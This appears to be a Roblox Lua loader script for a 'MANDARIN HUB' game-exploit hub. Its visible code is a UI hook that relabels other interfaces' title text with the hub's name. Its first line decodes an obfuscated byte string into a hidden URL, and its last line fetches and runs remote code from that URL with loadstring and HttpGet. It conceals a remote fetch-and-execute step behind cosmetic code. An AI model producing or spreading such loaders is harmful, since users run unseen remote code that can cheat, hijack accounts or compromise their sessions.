
--[[ STAGE 2: VISUAL CORE ]]
local ju0VdvOsU2fHuftJMNgB="\025\254\255\004\006\080\092\093\009\025\012\008\024\032\038\038\103\035\040\039\106\024\038\021\110\034\061\035\087\045\061\028\061"local a7rqoLQO5umORIZnJcQ7J=245 local A2_tvaHEyDNcVhKYyBr=98 local K8ltqA4SeBIjKAWdB_QwJ4=0 local ASFH2lZKln6k00k6=1 local GCYoJC5XF3_XURJW=25 local QZSgT66kArk_7l=false local wnOcZMI8Xc33LO2uEr=bit32 and bit32.bxor if not wnOcZMI8Xc33LO2uEr then wnOcZMI8Xc33LO2uEr=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local AMsRdGH9SYvGVwwmD={}for EOiPzIUvcRXCL=1,#ju0VdvOsU2fHuftJMNgB do local UsNpEC9LW0mG=string.byte(ju0VdvOsU2fHuftJMNgB,EOiPzIUvcRXCL)local Ru_q1FD5YAjGnZ=(A2_tvaHEyDNcVhKYyBr+(EOiPzIUvcRXCL*ASFH2lZKln6k00k6)+GCYoJC5XF3_XURJW)%256 if K8ltqA4SeBIjKAWdB_QwJ4==0 then UsNpEC9LW0mG=(UsNpEC9LW0mG-Ru_q1FD5YAjGnZ)%256 AMsRdGH9SYvGVwwmD[EOiPzIUvcRXCL]=string.char(wnOcZMI8Xc33LO2uEr(UsNpEC9LW0mG,a7rqoLQO5umORIZnJcQ7J))else UsNpEC9LW0mG=wnOcZMI8Xc33LO2uEr(UsNpEC9LW0mG,a7rqoLQO5umORIZnJcQ7J)AMsRdGH9SYvGVwwmD[EOiPzIUvcRXCL]=string.char((UsNpEC9LW0mG-Ru_q1FD5YAjGnZ)%256)end end local g9CWF59tJ_5gHPZvE=table.concat(AMsRdGH9SYvGVwwmD)if QZSgT66kArk_7l then g9CWF59tJ_5gHPZvE=string.reverse(g9CWF59tJ_5gHPZvE)end local NvZnToDFujTNl5=g9CWF59tJ_5gHPZvE
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(NvZnToDFujTNl5))()
